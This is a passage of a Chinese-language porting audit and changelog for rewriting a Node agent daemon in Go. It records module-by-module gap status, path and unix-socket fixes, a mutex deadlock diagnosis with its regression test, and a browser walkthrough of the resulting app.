| `activity-curator.ts`（341）                                                                                                                                                                                                                                                                   | **PARTIAL** — 活动时间戳有（`lastActivityAt`）；Node 的「按天/周聚合的曲目」用于活动热图，Go 未实现。                                                                                                                                        |
| `provider-launch-config.ts`（274）                                                                                                                                                                                                                                                             | **PORTED** — `LaunchConfig`/`LaunchOptions` 与每 provider 的参数分流（含本轮修掉的 omp 分流）。                                                                                                                                              |
| `create-agent-lifecycle-dispatch.ts`（273） / `agent-roles.ts`（93）                                                                                                                                                                                                                           | **PORTED** — 创建生命周期与 role（chief）在 `ws_agent.go`；`features.agentRoleNames` 已下发。                                                                                                                                                |

### utils/path.ts | 190 | **MISSING → 已补路径等价比较**

这条影响面比行数大得多：**daemon 里每一处路径比较都是字符串比较**。同一个目录可以是 `/tmp/x` 或 `/private/tmp/x`（macOS 上 `/tmp` 是符号链接）、带尾斜杠、带冗余 `.` 段、或在大小写不敏感的文件系统上大小写不同——每种写法都被当成不同的地方。

可见症状是 `ResolveWorkspaceIDForPath` 报「这个目录没有归属」，然后调用方给它**新建第二个工作区**：侧边栏出现重复条目、agent 挂到「另一个」工作区上、diff 跟错树比。

`internal/pathutil` 提供 `ExpandTilde`（先看 HOME，再退 `os.UserHomeDir`，所以有意的覆盖能生效）、`AreEquivalent`（先词法、再解析符号链接）、`EquivalenceMatcher`（预计算变体，用于对每个工作区循环）、`IsWithin` 带分隔符检查（`/repo/app` 不能声称包含 `/repo/application`）。不存在的路径回落到词法比较——realpath 失败不该让两个相同字符串变不等。

端到端验证：通过符号链接访问的路径、带尾斜杠的路径都解析到同一个工作区 id。

### terminal/ 的 worker 架构 | 1803+885+351+165 行 | **架构等价，非缺口**

Node 把终端会话放进一个独立的 worker 进程（`worker-terminal-manager.ts` fork `terminal-worker-process.ts`，协议在 `terminal-worker-protocol.ts`），原因是 Node 单线程：PTY 读写的量和 `@xterm/headless` 的网格计算会把 daemon 的事件循环卡住，整个 RPC 层跟着停顿。

Go 用 goroutine 与真实的 OS 线程处理 PTY 读写，没有事件循环可以被卡住，所以**不存在需要绕开的东西**。对应关系：

- `terminal.ts`（1803）的会话与 VT 网格 → `internal/terminal/{pty,vt}.go`
- `terminal-manager.ts`（501）的成员管理 → `internal/server` 的 `terminals` 表 + `broadcastTerminalsChanged`
- `terminal-session-controller.ts`（1226）的 RPC 面 → `ws_workspace.go` 的终端 case
- worker 的输入模式跟踪与 `replayPreamble` → `internal/terminal/vt.go:260` 已实现（重连时把 `?2004h`/`?1000h`/`?1049h` 这些模式重新推给前端）

**判断**：机制不需要，语义都在。这条不列入未完成。

### terminal/agent-hooks/{claude,codex}/** | 260 行 | **MISSING（已知）\*\*

只有 pi 的 hook 安装（`internal/terminal/vt.go`）。claude 的 `settings.json` 与 codex 的 `hooks.json` 改写未移植——`byspace hooks <agent> <event>` 的 shim 已能接受这两个 provider 的事件（映射表齐全），缺的是**安装**那一步。已记在未完成清单。

### cli/utils/client.ts | 484 | **PARTIAL → 已补 unix socket 与 BYSPACE_HOST**

daemon 能监听 unix socket（`serve --addr unix:///path`，受限环境需要），但**没有任何客户端能连上它**：`dialDaemonWS` 与 `probeHealth` 都只会拼 `host:port`。后果是 `daemon status` 把一个明明在跑的 daemon 报成 stopped，其余命令全部连不上。

两处现在都识别 socket 路径并拨号。socket 连接上的 Host 头是 `localhost`，daemon 的 allowed-hosts 规则永远接受它——socket 没有有意义的 host 可校验。

`BYSPACE_HOST` 也会在没给 `--addr`（或给了默认值）时被读取，这样脚本或第二个 checkout 能一次把每条命令指向不同的 daemon，不用重复传 flag。

端到端验证：`daemon status --addr /tmp/us3.sock` 报 running、带 serverId 与 provider 列表。

**仍缺**：`ssh://` 传输（`createSshTunnel` / `parseSshTransportUri`）——属于 tunnel，需要第二台机器，条件记在 service-proxy Issue 里。

### cli/commands/** 其余 | 约 60 文件 | **PORTED（命令面已逐条核对）\*\*

按顶层命令逐个对过（见 `cli.ts` 那一条的对照表），每条 Node 命令在 Go 里都有承接；本轮补了 `schedule update`、`workspace setup`、`agent attach`、`onboard`、`hooks`、`--yaml`/`-q`、路径直开、provider 健康与版本漂移。

**没有逐文件读实现体**（`commands/schedule/shared.ts` 471 行、`commands/agent/inspect.ts` 280、`update.ts` 274、`ls.ts` 271、`send.ts` 246 等）。它们的输出格式由 `internal/cli/output.go` 统一，参数解析由各自的 `flag.FlagSet`，具体字段面由入站/出站对账脚本覆盖。**留在未完成清单**，不折算成逐文件结论。

### server/orchestration-skills/internal/** | 5 文件 1585 行 | **PARTIAL → 已补两处\*\*

| 文件                                                        | 结论                                                                                                                                                                                                                                                                                                                                                                                  |
| ----------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `selection-store.ts`                                        | **MISSING → 已补**。`coerceSkillNames` 会把保存的选择与 bundle 实际提供的 skills 求交；Go 在 custom 模式下保留每一个名字。后果：升级后某个 skill 被改名或删除，那个残留名字成了「想要但无源可拷」的条目，**整个 reconcile 失败**而不是丢掉一条——而用户在 UI 里既看不到也无法修（stale 名字不在选择器里）。                                                                            |
| `operations.ts`                                             | **MISSING → 已补 `autoUpdateInstalledSkills`**。daemon 自带 skills，所以更新后每一份已安装副本都是旧的，直到有人在设置里重新保存选择——而用户没有任何理由去做这件事，也没人告诉他。设置页显示 drift、agent 继续用旧副本。现在启动时修复，**只应用非破坏性操作**：删除被排除，因为托管目录可能含用户放进去的文件，删除需要他确认计划。只有删除的 drift 留给交互路径，而不是报成已修复。 |
| `paths.ts` / `transaction.ts` / `sync.ts` / `controller.ts` | **PORTED** — 路径解析（`resolveSkillsSourceDir`/`resolveSkillTargets`）、事务写入与回滚（`skills_rollback_test.go` 已验证失败时恢复原内容且不留备份目录）、diff/apply 在 `internal/server/skills.go`。                                                                                                                                                                                |

### server/test-utils/** | 12 文件 2305 行 | **N/A\*\*

测试辅助（平台标记、日志桩、fixture 构造、vitest setup）。Go 侧用 `testing`、`t.TempDir()` 与假 provider 脚本（`writeFaithfulFakePi`）达到同样目的。

### agent/providers/claude/subagents/** | 5 文件 1311 行 | **PARTIAL → 已补两处\*\*

| 文件                                                                                       | 结论                                                                                                                                                                                                                                                                                                                                                                                                                                                               |
| ------------------------------------------------------------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| `presentation.ts`                                                                          | **MISSING → 已补 subtitle**。`subtitle` 是协议字段（`ProviderSubagentDescriptorPayloadSchema`），Go 的 `SubagentDescriptor` 里**根本没有**。没有它子代理那一行只显示状态，不显示 `标题 · 模型 · 强度 · token`。现在按 presentation.ts 的规则拼接（缺的跳过、全缺返回 nil 而不是空串——空串会让客户端渲染一行空白），token 压缩成 `12.3k tok`（完整数字会把模型和强度挤出窄行）。每次活动事件重建，所以随着子代理报告模型与用量逐步填充，而不是冻结在第一次 upsert。 |
| `live-source.ts` / `replay-source.ts` / `workflow-replay-source.ts` / `workflow-output.ts` | **PARTIAL** — 子代理的实时来源（`parent_tool_use_id` 路由，本轮补）与 `.jsonl` 重放（`internal/agent/pi/subagents.go`）都在。**缺** workflow 型子代理（多步流水线）的重放来源——Claude 的 workflow 输出格式尚未解析。                                                                                                                                                                                                                                               |

**顺带修掉一个真 bug**：`Task` 分支构造了 `SubagentDescriptor` 之后**没有存进 map、也没有广播**（我这次改动前的代码就是空的 `{ }` 块）。于是 Claude 的 agent 委派任务时，**Subagents 面板里什么都不出现**——委派从用户视角是完全不可见的，尽管 daemon 手里已经拿到了 descriptor。已补上 map 写入 + `agent.provider_subagents.update` 广播，并有测试断言 Task 会注册子代理且 subtitle 正确。

### server/ 顶层审计完成

`claude`(15) `codex`(6) `pi`(11) `opencode`(9) 的实现都在 `internal/agent/providers/{claude,codex,acp,opencode}.go` 与
`internal/agent/pi/**`，逐项对应关系已在前面的 `runtime-mcp-config`、`image` 转发、
`tree-kill`、`rewind` 等条目里记录。**本轮没有发现新缺口**，但也没有逐文件过一遍——
这一条**不算完成**，留在 Issue 的未完成清单里。

### server/ 顶层审计完成

`archive/packages/server/src/server/*.ts` 共 68 个非测试文件已全部有结论。
下一步进入子目录：`session/**`、`agent/**`、`terminal/**`、`services/**`、`utils/**`。

按行数排序，下一轮从这里继续：

`websocket-server.ts` 2771 · `bootstrap.ts` 1883 · `workspace-git-service.ts` 3601 ·
`worktree-bootstrap.ts` 1101 · `worktree-session.ts` 929 · `workspace-reconciliation-service.ts` ·
`workspace-archive-service.ts` · `workspace-auto-name.ts` · `workspace-bootstrap-dedupe.ts` ·
`workspace-source.ts` · `agent-history-search.ts` · `checkout-diff-manager.ts` ·
`resolve-workspace-id-for-path.ts` · `persisted-config.ts` · 以及其余 55 个。

---

## 批次 2-9

未开始。范围见 Issue。

## 已修复：agent 创建后不产出任何响应（重复加锁死锁）

### 根因

`handleRawEvent` 在 **持有 `s.mu` 的情况下** 处理每个 pi 事件，而它调用的
`handleEntryCaptureNotification` / `handleCommandResultNotification` 内部又 `s.mu.Lock()`。
Go 的 `sync.Mutex` 不可重入，于是 stdout 读循环**永久死锁**。

触发条件极其具体：pi 扩展必须在 `session_start` 时发一条 `BYSPACE_ENTRY_CAPTURE` 通知。
没有扩展时锁不会被重入，所以「无扩展 → 有响应，有扩展 → 无响应」。

这正是它难查的原因：pi 子进程**行为完全正常**（trace 显示 `agent_start`、`message_update`、
`turn_end`、`agent_end` 全部到达、顺序正确），只是 Go 再也没读下一行。外部表现是
「代理接受了 prompt 然后什么都不做，没有任何错误」。

### 定位过程

1. 给 `jsonl.Process` 加持久化协议 trace（`BYSPACE_PI_TRACE=<path>`），写入两个方向的每一帧。
   用 stderr 是不行的：daemon 自己的日志会与之交错。
2. trace 显示 pi 发了 295 行、含完整事件序列 → 问题在 Go 侧。
3. 用 `BYSPACE_PI_EXTENSION_PATH` 逐个替换扩展：**无扩展 → 正常**。
4. 把扩展拆成最小片段二分：`session_start` + 发 `BYSPACE_ENTRY_CAPTURE` → 阻塞；
   同一钩子发普通文本 → 正常。到此锁定为「标记 + 回环处理」的组合。

### 顺带修掉的两个真 bug

- **`PI_SESSION_FILE` 等 pi 会话身份泄漏**：从 pi agent 内部启动的 daemon（本仓库的开发循环）
  会导出这些变量，子 pi 继承后往父 transcript 追加而不是开新会话。已加入剥离列表。
- **`syncPiPersistence` 抢跑**：启动时立刻发 `get_state`，而 pi 在 runtime 就绪前不响应，
  把 stdio 队列堵在那里。

### 验证

- 回归测试 `TestExtensionNotificationDoesNotDeadlock`：持锁调用通知，3 秒超时。
  已验证恢复死锁代码后该测试 **panic: test timed out**。
- 端到端：`tools: ["bash:running","bash:running","bash:running","bash:completed"]`，
  模型真的调用了 bash 工具并拿到输出。
- `npm run audit` 的浏览器检查从 **7/8** 变成 **10/10** —— 之前那一项一直是这个死锁造成的
  假失败（页面拿不到 agent 响应，思考菜单状态也就无从检查）。

## 2026-10-21 全功能走查（真实浏览器）

死锁修复后第一次完整走查。**这是首次 agent 真正能对话**，此前所有「已实现」的项都无法验证。

| 项目           | 结果       | 证据                                                                                                                                       |
| -------------- | ---------- | ------------------------------------------------------------------------------------------------------------------------------------------ |
| 侧边栏         | ✅         | Chief 置顶（`BySpace-WorkSpace` 下第一个），其后 byspace / chat / server / tmp / gt 分组，右上角 `+`/History/排序/显示偏好齐全             |
| 新建 Agent tab | ✅         | `New tab` → 菜单 `Agent ⇧⌘A` / `Terminal ⇧⌘T`，fallback 到 Terminal profiles（Claude Code / Codex）                                        |
| 真实对话       | ✅         | `Thinking` 折叠块 → `Shell echo WALKTHROUGH_OK` 工具卡片 → 输出 `WALKTHROUGH_OK` → `Worked for 4s, ended 1:28 PM`                          |
| 工具卡片展开   | ✅         | `$` / `echo WALKTHROUGH_OK` / `WALKTHROUGH_OK` 三段都在                                                                                    |
| 上下文用量环   | ✅         | `Context window 2% used`（这是 `lastUsage` 的验证，之前一直空）                                                                            |
| 消息操作       | ✅         | `Rewind to this message`、`Copy message`、`Copy turn`、`Fork chat from here`、`Collapse all tool calls`                                    |
| 思考档位       | ✅         | `Select thinking option (Max)`，模型 `DeepSeek V4.1 Flash` → `Select model`                                                                |
| 终端           | ✅         | canvas 渲染（observe 抓不到文本），真实敲 `echo TERMINAL_LIVE_OK` 有回显，提示符显示 `.dev/byspace-home/chief on git main`                 |
| Settings 一级  | ✅         | Overview / Projects / Connections / Agents / Usage 五项                                                                                    |
| Agents 页      | ✅         | Claude Code / Codex / OpenCode / Pi 都在，`Orchestration skills` 区块正常                                                                  |
| Usage 页       | ✅         | Codex / Z.ai 各显示 `Unavailable`（未配凭据时的正确表述，不是空数组）                                                                      |
| History        | ✅         | 搜索框可用，`Import session` 弹窗列出本机真实 pi 会话                                                                                      |
| Explorer       | ✅（有限） | `Files` / `Changes` / `Browse workspace files` / `Working tree diff` 都在；当前工作区不是 git 仓库，显示 `Not a git repository` 是正确行为 |

### 仍未走查

- **git 仓库工作区**的 Changes / Commits / Diff（需要一个有未提交改动的 git 工作区）
- **PWA 安装与离线**、手机尺寸布局
- **Relay E2E**（需要第二个设备或真实 relay 地址）

### 顺手发现的环境噪音

`.dev/byspace-home` 里积累了大量 e2e 测试留下的工作区（`chat`、`server/Chief check`、`tmp`、`gt/test-slug` 等）。
不影响功能，但走查时会把真实项目与测试残留混在一起。
